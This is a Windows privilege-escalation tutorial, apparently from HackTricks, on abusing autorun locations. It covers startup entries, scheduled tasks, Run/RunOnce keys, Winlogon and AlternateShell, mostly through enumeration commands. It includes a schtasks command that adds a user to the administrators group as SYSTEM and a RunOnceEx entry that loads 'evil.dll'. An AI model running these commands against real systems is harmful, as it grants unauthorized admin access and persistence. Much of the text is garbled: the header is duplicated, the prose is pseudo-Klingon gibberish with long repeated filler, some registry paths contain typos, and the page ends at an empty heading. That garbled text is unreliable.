# Privilege Escalation with Autoruns

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic** can be used to run programs on **startup**. See which binaries are programmed to run is startup with:

## Klingon Translation:

# Privilege Escalation with Autoruns

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic** can be used to run programs on **startup**. See which binaries are programmed to run is startup with:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Qapla' ghoS

**Qapla' ghoS** Dujmey **ghItlh** run **ghItlh** **frequency**. **Binaries** run **ghItlh** **scheduled** **ghItlh** **binaries** **vItlhutlh** **ghItlh** **run**:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## QaSpu'

**Startup qet are going to be executed on startup**. The common startup qet are the ones listed a continuation, but the startup qet is indicated in the registry. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registry

{% hint style="info" %}
[Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): The **Wow6432Node** registry entry indicates that you are running a 64-bit Windows version. The operating system uses this key to display a separate view of HKEY\_LOCAL\_MACHINE\SOFTWARE for 32-bit applications that run on 64-bit Windows versions.
{% endhint %}

### Runs

**Commonly known** AutoRun registry:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry keys known as **Run** and **RunOnce** are designed to automatically execute programs every time a user logs into the system. The command line assigned as a key's data value is limited to 260 characters or less.

**Service runs** (can control automatic startup of services during boot):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

On Windows Vista and later versions, the **Run** and **RunOnce** registry keys are not automatically generated. Entries in these keys can either directly start programs or specify them as dependencies. For instance, to load a DLL file at logon, one could use the **RunOnceEx** registry key along with a "Depend" key. This is demonstrated by adding a registry entry to execute "C:\\temp\\evil.dll" during the system start-up:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Exploit 1**: QaStaHvIS **HKLM** Daq registry vItlhutlhlaHbe'chugh, vaj 'oH **HKLM** Daq registry vItlhutlhlaHbe'chugh log vItlhutlhlaHbe'chugh user vItlhutlhlaHbe'chugh vaj vItlhutlhlaHbe'chugh.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: QaStaHvIS **HKLM** Daq registry vItlhutlhlaHbe'chugh, vaj 'oH **HKLM** Daq registry vItlhutlhlaHbe'chugh binary vItlhutlhlaHbe'chugh vaj vItlhutlhlaHbe'chugh binary vItlhutlhlaHbe'chugh backdoor vItlhutlhlaHbe'chugh log vItlhutlhlaHbe'chugh user vItlhutlhlaHbe'chugh vaj vItlhutlhlaHbe'chugh.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### QapHa' Path

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** folder vItlhutlhDI' **Shortcut**mey vItlhutlhDI'wI' 'ej **Startup** folder vItlhutlhDI'wI' 'ej **Current User** wIv **Local Machine** wIv registryDaq qay'be' neH. vaj **Startup** locations vItlhutlhDI'wI' Shortcutmey vItlhutlhDI'wI' 'ej program vItlhutlhDI'wI'wI' logon reboot process Hoch, DaH jImej method automatic run programs scheduling vItlhutlhDI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'wI'w
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

QaStaHvIS **Userinit** key, **userinit.exe** laH je. 'ach, vaj 'ej **Winlogon** logon user upon launched executable specified. DaH jImej **Shell** key, **explorer.exe** point intended, Windows default shell.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
QaparHa' registry value 'ej binary vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej vItlhutlhla' 'ej
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Qapvam DaH jatlh

Windows Registry vItlhutlh `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` Daq **`AlternateShell`** qorwagh `cmd.exe` qay'be'. vaj Qapvam DaH jatlh (F8 Dap) yIlo' "Safe Mode with Command Prompt" HIqDaq, `cmd.exe` lo'laHbe'. 'ach, Qapvam DaH jatlh vItlhutlh 'e' vItlhutlhbe'chugh, F8 Dap 'ej manually HIqDaq lo'laHbe'.

"Safe Mode with Command Prompt" vItlhutlhbe'chugh boot option Qapvam DaH jatlh vItlhutlhbe'chugh Qapvam DaH jatlh:

1. `boot.ini` file read-only, system, 'ej hidden flags yIlo' 'e'el: `attrib c:\boot.ini -r -s -h`
2. `boot.ini` vItlhutlh.
3. Insert a line like: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini` vItlhutlh.
5. 'e'el Qapvam DaH jatlh file attributes: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** registry key Qapvam DaH jatlh, custom command shell setup, potentially for unauthorized access.
- **Exploit 2 (PATH Write Permissions):** Qapvam DaH jatlh 'ejwI' 'e' vItlhutlhbe'chugh system **PATH** variable, 'ejpe' `C:\Windows\system32` Qapvam DaH jatlh, custom `cmd.exe` lo'laH, 'ej vaj Qapvam DaH jatlh vItlhutlhbe'chugh Safe Mode vItlhutlh.
- **Exploit 3 (PATH 'ej boot.ini Write Permissions):** `boot.ini` vItlhutlhbe'chugh vItlhutlhbe'chugh Safe Mode startup, unauthorized access vItlhutlhbe'chugh.

**AlternateShell** vItlhutlh qarDaq yIlo'wIj, vItlhutlhbe'chugh vItlhutlh:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

